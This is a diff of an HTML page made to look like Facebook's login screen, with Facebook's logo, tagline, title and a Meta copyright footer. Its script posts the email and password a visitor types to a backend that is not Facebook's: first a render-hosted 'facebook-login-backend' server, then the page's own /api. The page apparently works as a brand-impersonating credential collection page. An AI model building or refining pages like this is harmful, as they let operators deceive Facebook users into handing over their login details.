@@ -1,206 +1,399 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Facebook</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Log in or sign up</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
+
         body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background: #f0f2f5;
-            font-family: Arial, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .container {
+            flex: 1;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
+            padding: 20px;
         }
-        .container {
-            background: white;
-            padding: 40px;
-            border-radius: 8px;
-            width: 400px;
-            text-align: center;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+
+        .left-section {
+            width: 500px;
+            margin-right: 50px;
         }
-        .logo {
-            font-size: 56px;
+
+        .facebook-logo {
             color: #1877f2;
-            font-weight: bold;
+            font-size: 55px;
+            font-weight: 700;
             margin-bottom: 20px;
         }
-        input {
-            width: 100%;
-            padding: 14px;
-            margin: 8px 0;
-            border: 1px solid #ddd;
-            border-radius: 6px;
-            font-size: 17px;
+
+        .tagline {
+            font-size: 28px;
+            color: #1c1e21;
+            line-height: 32px;
         }
-        button {
+
+        .right-section {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            width: 396px;
+        }
+
+        .input-field {
             width: 100%;
-            padding: 14px;
-            margin: 8px 0;
+            padding: 14px 16px;
+            font-size: 17px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            margin-bottom: 12px;
+            background: #ffffff;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+
+        .login-btn {
             background: #1877f2;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: 600;
+            padding: 12px;
+            width: 100%;
             color: white;
+            cursor: pointer;
+            margin-bottom: 16px;
+        }
+
+        .login-btn:hover {
+            background: #1666d1;
+        }
+
+        .forgot-link {
+            text-align: center;
+            margin: 16px 0;
+        }
+
+        .forgot-link a {
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .forgot-link a:hover {
+            text-decoration: underline;
+        }
+
+        hr {
+            border: none;
+            border-top: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+
+        .create-btn {
+            background: #42b72a;
             border: none;
             border-radius: 6px;
             font-size: 17px;
-            font-weight: bold;
+            font-weight: 600;
+            padding: 12px;
+            width: 100%;
+            color: white;
             cursor: pointer;
         }
-        button:hover {
-            background: #1663c7;
+
+        .create-btn:hover {
+            background: #36a420;
         }
+
         .message {
-            margin-top: 10px;
-            padding: 10px;
+            margin-top: 16px;
+            padding: 12px;
             border-radius: 6px;
+            text-align: center;
             display: none;
         }
-        .message.error {
-            background: #ffe5e5;
-            color: #e41e3f;
-            display: block;
-        }
+
         .message.success {
-            background: #e5ffe5;
-            color: #31a24c;
+            background: #d4edda;
+            color: #155724;
             display: block;
         }
-        .link {
-            color: #1877f2;
-            cursor: pointer;
-            margin-top: 10px;
-            display: inline-block;
+
+        .message.error {
+            background: #f8d7da;
+            color: #721c24;
+            display: block;
         }
-        .form-group {
+
+        .footer {
+            text-align: center;
+            padding: 20px;
+            color: #737373;
+            font-size: 12px;
+        }
+
+        /* Modal */
+        .modal {
             display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
         }
-        .form-group.active {
-            display: block;
+
+        .modal.active {
+            display: flex;
+        }
+
+        .modal-content {
+            background: white;
+            border-radius: 8px;
+            width: 432px;
+            max-width: 90%;
+            padding: 16px;
+        }
+
+        .modal-header {
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 12px;
+        }
+
+        .modal-close {
+            float: right;
+            font-size: 28px;
+            cursor: pointer;
+        }
+
+        .welcome-card {
+            text-align: center;
+            padding: 20px;
+        }
+
+        .welcome-name {
+            font-size: 24px;
+            font-weight: bold;
+            color: #1877f2;
+            margin: 20px 0;
+        }
+
+        .logout-btn {
+            background: #e41e3f;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: 600;
+            padding: 12px;
+            width: 100%;
+            color: white;
+            cursor: pointer;
+            margin-top: 16px;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">f</div>
-        
-        <div id="loginForm" class="form-group active">
-            <h3>Log in to Facebook</h3>
-            <input type="text" id="loginEmail" placeholder="Email address">
-            <input type="password" id="loginPassword" placeholder="Password">
-            <button onclick="login()">Log In</button>
-            <div class="link" onclick="showRegister()">Create new account</div>
-        </div>
-        
-        <div id="registerForm" class="form-group">
-            <h3>Create a new account</h3>
-            <input type="text" id="regName" placeholder="Full name">
-            <input type="email" id="regEmail" placeholder="Email address">
-            <input type="password" id="regPassword" placeholder="Password">
-            <button onclick="register()">Sign Up</button>
-            <div class="link" onclick="showLogin()">Already have an account? Log in</div>
-        </div>
-        
-        <div id="message" class="message"></div>
+
+<div class="container">
+    <div class="left-section">
+        <div class="facebook-logo">facebook</div>
+        <div class="tagline">Connect with friends and the world around you on Facebook.</div>
     </div>
 
-    <script>
-        const API_URL = 'https://facebook-login-backend-muau.onrender.com/api';
-        
-        function showMessage(msg, type) {
-            const msgDiv = document.getElementById('message');
-            msgDiv.textContent = msg;
-            msgDiv.className = 'message ' + type;
-            setTimeout(() => {
-                msgDiv.className = 'message';
-            }, 3000);
+    <div class="right-section">
+        <div id="loginView">
+            <input type="text" id="loginEmail" class="input-field" placeholder="Email address or phone number">
+            <input type="password" id="loginPassword" class="input-field" placeholder="Password">
+            <button class="login-btn" onclick="handleLogin()">Log In</button>
+            <div class="forgot-link"><a id="forgotBtn">Forgotten password?</a></div>
+            <hr>
+            <button class="create-btn" onclick="showRegisterModal()">Create new account</button>
+        </div>
+
+        <div id="welcomeView" style="display: none;">
+            <div class="welcome-card">
+                <div class="facebook-logo" style="font-size: 40px;">facebook</div>
+                <div class="welcome-name" id="welcomeName"></div>
+                <p>You're now logged in!</p>
+                <button class="logout-btn" onclick="handleLogout()">Log Out</button>
+            </div>
+        </div>
+
+        <div id="messageDiv" class="message"></div>
+    </div>
+</div>
+
+<div class="footer">
+    <span>Meta © 2026</span>
+</div>
+
+<!-- Register Modal -->
+<div id="registerModal" class="modal">
+    <div class="modal-content">
+        <span class="modal-close" onclick="closeRegisterModal()">&times;</span>
+        <div class="modal-header">Sign Up</div>
+        <input type="text" id="regName" class="input-field" placeholder="Full name">
+        <input type="email" id="regEmail" class="input-field" placeholder="Email address">
+        <input type="password" id="regPassword" class="input-field" placeholder="New password">
+        <button class="login-btn" onclick="handleRegister()" style="margin-top: 10px;">Sign Up</button>
+        <div id="regError" class="message error" style="display: none;"></div>
+    </div>
+</div>
+
+<script>
+    const API_URL = window.location.origin + '/api';
+    let authToken = localStorage.getItem('authToken');
+
+    function showMessage(msg, type) {
+        const msgDiv = document.getElementById('messageDiv');
+        msgDiv.textContent = msg;
+        msgDiv.className = 'message ' + type;
+        setTimeout(() => {
+            msgDiv.className = 'message';
+        }, 3000);
+    }
+
+    function showRegisterModal() {
+        document.getElementById('registerModal').classList.add('active');
+    }
+
+    function closeRegisterModal() {
+        document.getElementById('registerModal').classList.remove('active');
+        document.getElementById('regError').style.display = 'none';
+    }
+
+    async function handleLogin() {
+        const email = document.getElementById('loginEmail').value;
+        const password = document.getElementById('loginPassword').value;
+
+        if (!email || !password) {
+            showMessage('Please fill in both fields', 'error');
+            return;
         }
-        
-        async function login() {
-            const identifier = document.getElementById('loginEmail').value;
-            const password = document.getElementById('loginPassword').value;
-            
-            if (!identifier || !password) {
-                showMessage('Please fill all fields', 'error');
-                return;
+
+        showMessage('Logging in...', 'success');
+
+        try {
+            const response = await fetch(`${API_URL}/login`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ identifier: email, password: password })
+            });
+
+            const data = await response.json();
+
+            if (response.ok) {
+                localStorage.setItem('user', JSON.stringify(data.user));
+                showWelcome(data.user);
+                showMessage('Welcome back, ' + data.user.name + '!', 'success');
+                document.getElementById('loginPassword').value = '';
+            } else {
+                showMessage(data.error || 'Login failed', 'error');
             }
-            
-            showMessage('Logging in...', 'success');
-            
-            try {
-                const response = await fetch(API_URL + '/login', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ identifier, password })
-                });
-                
-                const data = await response.json();
-                
-                if (response.ok) {
-                    showMessage('Login successful! Welcome ' + data.user.name, 'success');
-                    setTimeout(() => {
-                        alert('Welcome ' + data.user.name + '!');
-                    }, 1000);
-                } else {
-                    showMessage(data.error, 'error');
-                }
-            } catch (error) {
-                showMessage('Network error: ' + error.message, 'error');
-            }
+        } catch (error) {
+            showMessage('Network error: ' + error.message, 'error');
         }
-        
-        async function register() {
-            const name = document.getElementById('regName').value;
-            const email = document.getElementById('regEmail').value;
-            const password = document.getElementById('regPassword').value;
-            
-            if (!name || !email || !password) {
-                showMessage('Please fill all fields', 'error');
-                return;
-            }
-            
-            if (password.length < 6) {
-                showMessage('Password must be at least 6 characters', 'error');
-                return;
-            }
-            
-            showMessage('Creating account...', 'success');
-            
-            try {
-                const response = await fetch(API_URL + '/register', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ name, email, password })
-                });
-                
-                const data = await response.json();
-                
-                if (response.ok) {
-                    showMessage('Account created! Please login.', 'success');
-                    showLogin();
-                    document.getElementById('regName').value = '';
-                    document.getElementById('regEmail').value = '';
-                    document.getElementById('regPassword').value = '';
-                } else {
-                    showMessage(data.error, 'error');
-                }
-            } catch (error) {
-                showMessage('Network error: ' + error.message, 'error');
-            }
+    }
+
+    async function handleRegister() {
+        const name = document.getElementById('regName').value;
+        const email = document.getElementById('regEmail').value;
+        const password = document.getElementById('regPassword').value;
+        const errorDiv = document.getElementById('regError');
+
+        if (!name || !email || !password) {
+            errorDiv.textContent = 'All fields are required';
+            errorDiv.style.display = 'block';
+            return;
         }
-        
-        function showRegister() {
-            document.getElementById('loginForm').classList.remove('active');
-            document.getElementById('registerForm').classList.add('active');
+
+        if (password.length < 6) {
+            errorDiv.textContent = 'Password must be at least 6 characters';
+            errorDiv.style.display = 'block';
+            return;
         }
-        
-        function showLogin() {
-            document.getElementById('registerForm').classList.remove('active');
-            document.getElementById('loginForm').classList.add('active');
+
+        errorDiv.style.display = 'none';
+
+        try {
+            const response = await fetch(`${API_URL}/register`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ name, email, password })
+            });
+
+            const data = await response.json();
+
+            if (response.ok) {
+                closeRegisterModal();
+                showMessage('Account created! Please log in.', 'success');
+                document.getElementById('regName').value = '';
+                document.getElementById('regEmail').value = '';
+                document.getElementById('regPassword').value = '';
+            } else {
+                errorDiv.textContent = data.error;
+                errorDiv.style.display = 'block';
+            }
+        } catch (error) {
+            errorDiv.textContent = 'Network error: ' + error.message;
+            errorDiv.style.display = 'block';
         }
-    </script>
+    }
+
+    function showWelcome(user) {
+        document.getElementById('loginView').style.display = 'none';
+        document.getElementById('welcomeView').style.display = 'block';
+        document.getElementById('welcomeName').textContent = user.name;
+    }
+
+    function handleLogout() {
+        localStorage.removeItem('user');
+        document.getElementById('loginView').style.display = 'block';
+        document.getElementById('welcomeView').style.display = 'none';
+        document.getElementById('loginEmail').value = '';
+        document.getElementById('loginPassword').value = '';
+        showMessage('Logged out successfully', 'success');
+    }
+
+    // Check if user is already logged in
+    const savedUser = localStorage.getItem('user');
+    if (savedUser) {
+        try {
+            showWelcome(JSON.parse(savedUser));
+        } catch(e) {}
+    }
+
+    // Enter key support
+    document.getElementById('loginPassword').addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') handleLogin();
+    });
+    document.getElementById('loginEmail').addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') handleLogin();
+    });
+</script>
+
 </body>
 </html>
